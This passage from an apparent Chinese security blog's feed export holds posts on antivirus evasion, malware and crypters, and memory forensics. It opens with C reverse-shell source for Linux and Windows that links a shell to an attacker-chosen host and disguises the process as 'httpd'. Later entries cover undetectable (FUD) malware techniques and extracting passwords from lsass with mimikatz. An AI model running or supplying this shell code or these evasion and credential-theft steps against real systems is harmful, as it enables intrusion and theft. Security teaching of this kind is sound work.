class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;生成反弹shell&quot;&gt;&lt;a href=&quot;#生成反弹shell&quot; class=&quot;headerlink&quot; title=&quot;生成反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成反弹shell&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
    
      <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
    
      <category term="wine" scheme="http://c.cat.plus/tags/wine/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序及免杀技术现状</title>
    <link href="http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
    <id>http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</id>
    <published>2016-08-03T09:15:31.000Z</published>
    <updated>2020-06-10T08:31:40.420Z</updated>
    
    <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;恶意软件&quot;&gt;&lt;a href=&quot;#恶意软件&quot; class=&quot;headerlink&quot; title=&quot;恶意软件&quot;&gt;&lt;/a&gt;&lt;strong&gt;恶意软件&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="RAT" scheme="http://c.cat.plus/tags/RAT/"/>
    
      <category term="NanoCore" scheme="http://c.cat.plus/tags/NanoCore/"/>
    
      <category term="crypter" scheme="http://c.cat.plus/tags/crypter/"/>
    
  </entry>
  
  <entry>
    <title>活取证和死取证</title>
    <link href="http://c.cat.plus/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/"/>
    <id>http://c.cat.plus/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/</id>
    <published>2016-05-12T13:23:53.000Z</published>
    <updated>2020-07-10T08:20:59.849Z</updated>
    
    <content type="html"><![CDATA[<h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a><strong>活取证</strong></h4><ul><li><p><strong>从内存还原文字</strong></p><ul><li><code>https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</code>        #procdump</li><li><code>https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx</code>        #Windows下的strings工具  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma notepad.exe notepad.dmp</span><br><span class="line">strings notepad.dmp &gt; notepad.txt</span><br></pre></td></tr></table></figure></li><li>其它文字处理程序也适用</li></ul></li><li><p><strong>从内存还原图片</strong></p><ul><li>远程桌面,画图工具,Virtualbox虚拟机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 memdump -p 1456 -D test</span><br><span class="line">apt-get install gimp#kali安装gimp图片处理工具,媲美windows的PS</span><br><span class="line">mv mstsc.dmp mstsc.data#更改dmp文件格式</span><br><span class="line">gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>从内存中提取明文密码</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma lsass.exe lsass.dmp#dump lsass.exe在内存文件,任何windows版本登录后都会启动lsass.exe进程,用于保存密码</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;x64#mimikatz win64版kali所在路径</span><br><span class="line"></span><br><span class="line">Mimikatz#使用mimikatz </span><br><span class="line"></span><br><span class="line">sekurlsa::minidump lsass.dmp#load 内存文件</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords#提取 dump文件的身份认证信息</span><br></pre></td></tr></table></figure><ul><li><p>Volatility 的 mimikatz 插件</p><ul><li><code>https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</code></li><li><code>volatility -f 7.raw imageinfo</code></li><li><code>volatility -f 7.raw --profile=Win7SP1x64 mimikatz</code></li></ul></li><li><p>Firefox 浏览器审计工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dumpzilla</span><br><span class="line">dumpzilla &#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;ugyw3gav.default&#x2F; --All</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a><strong>死取证</strong></h4><ul><li><p><strong>硬盘镜像</strong></p><ul><li>使用kali光盘启动计算机创建硬盘镜像文件</li><li>留足存储镜像文件的存储空间</li><li>dc3dd 传说来自美国空军计算机犯罪中心开发</li><li>dcfldd</li><li>guymager        #图形化dd工具</li><li>计算机取证技术参考数据集<ul><li><code>http://www.cfreds.nist.gov/Controlv1_0/control.dd</code></li></ul></li></ul></li><li><p><strong>DFF</strong> (Digital Forensics Framework)</p><ul><li>数字取证框架</li><li>kali2.0版本后被移出</li><li>支持命令行和友好图形化界面</li><li>Open Evidence        #红色表示已经删除的文件</li><li>发现恢复已经删除和隐藏的文件</li></ul></li><li><p><strong>Autopsy</strong></p><ul><li>非常流行的硬盘镜像分析工具</li><li>WebServer + 客户端架构</li></ul></li><li><p><strong>Extundelete</strong></p><ul><li>适用于ext3,ext4文件系统的反删除工具</li><li><code>Extundelete [device-file] --restore-file [restore location]</code></li></ul></li><li><p><strong>iPhone Backup Analyzer</strong></p><ul><li>分析iTunes 生成的iPhone 手机备份文件,并非电话image</li></ul></li><li><p><strong>Foremost</strong> (美国政府开发)</p><ul><li>从内存dump中恢复文档图片,支持raw,dd,iso,vmem等格式</li><li><code>foremost -t jpeg,gif,png,doc -i 7.raw</code></li></ul></li></ul><h4 id="网络取证"><a href="#网络取证" class="headerlink" title="网络取证"></a><strong>网络取证</strong></h4><ul><li>各种抓包dump分析</li><li>全流量镜像可还原历史</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;活取证&quot;&gt;&lt;a href=&quot;#活取证&quot; class=&quot;headerlink&quot; title=&quot;活取证&quot;&gt;&lt;/a&gt;&lt;strong&gt;活取证&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;从内存还原文字&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;c
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="数字取证" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
      <category term="volatility" scheme="http://c.cat.plus/tags/volatility/"/>
    
      <category term="活取证" scheme="http://c.cat.plus/tags/%E6%B4%BB%E5%8F%96%E8%AF%81/"/>
    
      <category term="procdump" scheme="http://c.cat.plus/tags/procdump/"/>
    
      <category term="gimp" scheme="http://c.cat.plus/tags/gimp/"/>
    
      <category term="dc3dd" scheme="http://c.cat.plus/tags/dc3dd/"/>
    
  </entry>
  
  <entry>
    <title>使用取证工具Volatility进行内存文件分析及相关插件</title>
    <link href="http://c.cat.plus/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/"/>
    <id>http://c.cat.plus/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/</id>
    <published>2016-05-11T11:27:51.000Z</published>
    <updated>2020-07-10T05:09:29.341Z</updated>
    
    <content type="html"><![CDATA[<h4 id="取证工具"><a href="#取证工具" class="headerlink" title="取证工具"></a><strong>取证工具</strong></h4><ul><li>不考虑法律因素,法庭证据,监管链,文档纪录等取证环节</li><li>只介绍Kali当中部分取证工具的使用方法</li><li>内存dump工具<ul><li><strong>Dumpit</strong> (windows)<ul><li>下载: <code>http://www.secist.com/wp-content/uploads/2016/11/DumpIt.zip</code></li></ul></li><li>内存文件与内存大小接近或者稍微大一点,raw格式</li></ul></li></ul><h4 id="分析内存文件-Volatility及相关插件"><a href="#分析内存文件-Volatility及相关插件" class="headerlink" title="分析内存文件    #Volatility及相关插件"></a><strong>分析内存文件</strong>    #Volatility及相关插件</h4><pre><code>volatility imageinfo -f xp.raw            #文件信息,关注profilevolatility hivelist -f XP.raw --profile=WinXPSP3x86        #数据库文件volatility -f XP.raw --profile=WinXPSP3x86 hivedump        #列出蜂巢volatility -f XP.raw --profile=WinXPSP3x86 hivedump -o 0xe124f8a8    #按虚拟内存地址查看注册表内容volatility -f XP.raw --profile=WinXPSP3x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;     #用户账号volatility -f xp.raw --profile=WinXPSP3x86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;        #最后登录的用户volatility -f XP.raw --profile=WinXPSP3x86 userassist    #正在运行的程序,运行过多少次,最后一次运行时间等volatility -f XP.raw --profile=WinXPSP3x86 pslist        #进程列表及物理内存位置volatility -f 7.raw --profile=Win7SP1x64 memdump -p 1456 -D test/    #dump进程内存    hexeditor 1456.dmp        #16进制查看内存文件    strings 1456.dmp &gt; 1111.txt        #提取字符串查看 grep password / @volatility cmdscan -f 7.raw --profile=Win7SP1x64    #命令行历史volatility netscan -f 7.raw --profile=Win7SP1x64    #网络连接volatility iehistory -f 7.raw --profile=Win7SP1x64        #ie历史volatility -f 7.raw --profile=Win7SP1x64 hivelist        #列出蜂巢    volatility -f 7.raw --profile=Win7SP1x64 hashdump -y system内存虚地址 -s SAM内存虚地址        #提取hash</code></pre><p><strong>Volatility三方Firefoxhistory插件</strong></p><pre><code>http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip/usr/lib/python2.7/dist-packages/volatility/plugins/    #放到此路径volatility -f 7.raw --profile=Win7SP1x64 firefoxhistory        #查看firefox历史</code></pre><p><strong>USN日志记录插件</strong></p><ul><li>NTFS特性,用于跟踪硬盘内容变化(不记录具体变更内容)<ul><li><code>https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 usnparser --output&#x3D;csv --outputfile&#x3D;usn.csv</span><br><span class="line">#查看USN日志并导出到csv文件</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>Timeline插件</strong></p><pre><code>volatility -f 7.raw --profile=Win7SP1x64 timeliner    #从多个位置收集大量系统活动信息</code></pre><p><strong>内存取证发现恶意程序</strong></p><ul><li><p>恶意程序库</p><ul><li><code>https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</code></li><li><code>https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</code></li></ul></li><li><p>XP: 建立meterpreter session 后 dump 内存分析</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xp.raw --profile&#x3D;WinXPSP3x86 pstree</span><br><span class="line">volatility connscan#网络连接</span><br><span class="line">volatility getsids -p 111,222#SID,查看进程权限</span><br><span class="line">volatility dlllist -p 111,222#数量</span><br><span class="line">volatility malfind -p 111,222 -D test#输出结果查毒</span><br><span class="line">file *.dmp#查看文件类型</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;取证工具&quot;&gt;&lt;a href=&quot;#取证工具&quot; class=&quot;headerlink&quot; title=&quot;取证工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;取证工具&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;不考虑法律因素,法庭证据,监管链,文档纪录等取证环节&lt;/li&gt;
&lt;li&gt;只介绍
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="数字取证" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
    
      <category term="数字取证" scheme="http://c.cat.plus/tags/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
      <category term="Volatility" scheme="http://c.cat.plus/tags/Volatility/"/>
    
      <category term="Dumpit" scheme="http://c.cat.plus/tags/Dumpit/"/>
    
  </entry>
  
  <entry>
    <title>数字取证科学简介及取证方法</title>
    <link href="http://c.cat.plus/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/</id>
    <published>2016-05-01T11:27:51.000Z</published>
    <updated>2020-07-10T08:57:41.637Z</updated>
    
    <content type="html"><![CDATA[<h4 id="取证科学简介"><a href="#取证科学简介" class="headerlink" title="取证科学简介"></a><strong>取证科学简介</strong></h4><ul><li>Forensic investigations</li><li>法庭取证调查</li><li>事件相应调查<ul><li>黑客攻击,渗透测试留痕</li></ul></li></ul><p><strong>什么是Forensic科学</strong></p><ul><li>法医的,用于法庭的,辩论学,法医学</li><li>为了侦破案件还原事实真相,收集法庭证据的一系列科学方法<ul><li>参考本地区法律要求</li><li>实践操作通用原则</li></ul></li></ul><p><strong>CSI:物理取证</strong></p><ul><li>指纹,DNA,弹道,血迹</li><li>物理取证的理论基础是物质交换原则</li></ul><p><strong>数字取证/计算机取证/电子取证</strong></p><ul><li>智能设备,计算机,手机平板,IoT,有线及无线通信,数据存储</li></ul><h4 id="计算机取证通用原则"><a href="#计算机取证通用原则" class="headerlink" title="计算机取证通用原则"></a><strong>计算机取证通用原则</strong></h4><ul><li><p><strong>维护证据完整性</strong></p><ul><li>数字取证比物理取证幸运得多,可以有无限数量的拷贝进行分析</li><li>数字HASH值验证数据完整性</li></ul></li><li><p><strong>维护监管链</strong></p><ul><li>物理证物保存在证物袋中,每次取出使用严格纪录,避免破坏污染</li><li>数字证物原始版本写保护,使用拷贝进行分析</li></ul></li><li><p><strong>标准的操作步骤</strong></p><ul><li>证物使用严格按照规范流程,即使事后证明流程有误(免责)</li></ul></li><li><p>取证分析全部过程纪录文档</p></li><li><p><strong>数字取证者的座右铭</strong></p><ul><li>不要破坏数据现场(看似简单,实际几乎无法实现)</li><li>寄存器,CPU缓存,I/O设备缓存等易失性数据几乎无法获取</li><li>系统内存是主要的易失性存储介质取证对象,不修改无法获取其中数据</li><li>非易失性存储介质通常使用完整镜像拷贝保存</li><li>正常关机还是直接拔掉电源(数据丢失破坏)</li></ul></li><li><p><strong>证据搜索</strong></p><ul><li>数据</li><li>信息</li><li>证据</li></ul></li><li><p>作为安全从业者</p><ul><li>通过取证还原黑客入侵的轨迹</li><li>作为渗透测试和黑客攻击区分标准<ul><li>世纪佳缘事件</li><li>印象笔记渗透测试事件</li></ul></li></ul></li></ul><h4 id="取证方法"><a href="#取证方法" class="headerlink" title="取证方法"></a><strong>取证方法</strong></h4><ul><li><p><strong>活取证</strong></p><ul><li>抓取文件metadata,创建时间线,命令历史,分析日志文件,哈希摘要,转存内存信息</li><li>使用未受感染的干净程序执行取证</li><li>U盘 / 网络 存储收集到的数据</li></ul></li><li><p><strong>死取证</strong></p><ul><li>关机后制作硬盘镜像,分析镜像(MBR,GPT,LVM)</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;取证科学简介&quot;&gt;&lt;a href=&quot;#取证科学简介&quot; class=&quot;headerlink&quot; title=&quot;取证科学简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;取证科学简介&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Forensic investigations&lt;/li&gt;
&lt;l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="数字取证" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
    
      <category term="数字取证" scheme="http://c.cat.plus/tags/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
      <category term="计算机取证" scheme="http://c.cat.plus/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
    
      <category term="电子取证" scheme="http://c.cat.plus/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>社会工程学工具包Setoolkit</title>
    <link href="http://c.cat.plus/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/"/>
    <id>http://c.cat.plus/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/</id>
    <published>2016-03-20T13:57:21.000Z</published>
    <updated>2020-07-09T08:36:49.599Z</updated>
    
    <content type="html"><![CDATA[<h4 id="为什么在这说社会工程学-Social-Engineering"><a href="#为什么在这说社会工程学-Social-Engineering" class="headerlink" title="为什么在这说社会工程学 (Social Engineering)"></a><strong>为什么在这说社会工程学</strong> (Social Engineering)</h4><ul><li>Metasploit 可以很好的配合到社会工程学攻击的各个阶段</li><li>Setoolkit 工具包大量依赖 Metasploit</li><li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li></ul><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" 